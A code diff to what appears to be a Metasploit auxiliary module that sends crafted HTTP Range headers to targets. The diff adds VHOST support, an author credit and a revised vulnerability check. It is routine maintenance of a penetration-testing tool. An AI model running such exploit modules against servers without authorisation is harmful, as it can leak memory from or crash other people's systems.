@@ -23,7 +23,9 @@ class MetasploitModule < Msf::Auxiliary
       'Author'      =>
         [
           'Rich Whitcroft <rwhitcroft[at]gmail.com>', # Msf module
-          'sinn3r'                                    # Some more Metasploit stuff
+          'sinn3r',                                   # Some more Metasploit stuff
+          'Sunny Neo <sunny.neo[at]centurioninfosec.sg>' #Added VHOST option
+
         ],
       'License'     => MSF_LICENSE,
       'References'  =>
@@ -43,7 +45,6 @@ class MetasploitModule < Msf::Auxiliary
       OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
     ])
 
-    deregister_options('VHOST')
   end
 
   def potential_static_files_uris
@@ -161,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     begin
-      unless check_host(ip)
+      if check_host(ip) == Exploit::CheckCode::Safe
         print_error("Target is not vulnerable")
         return
       else
@@ -186,6 +187,7 @@ class MetasploitModule < Msf::Auxiliary
       req = cli.request_raw(
         'uri' => target_uri.path,
         'method' => 'GET',
+        'vhost' => "#{datastore['VHOST']}",
         'headers' => {
         'Range' => ranges
         }
